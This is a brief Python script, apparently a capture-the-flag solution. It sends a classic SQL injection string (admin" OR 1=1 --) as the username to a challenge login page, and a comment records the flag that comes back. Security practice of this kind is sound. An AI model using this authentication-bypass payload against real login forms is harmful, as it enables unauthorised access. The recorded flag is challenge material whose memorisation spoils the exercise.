

import requests

url="https://challenges.isictf.live:1406/"



r=requests.post( url ,data={
    'username':'admin" OR 1=1 --',
    'password':'anything'
})

print(r.text)

#Welcome! here's your flag: ISICTF{my_f1r57_sql_1nj3c710n}


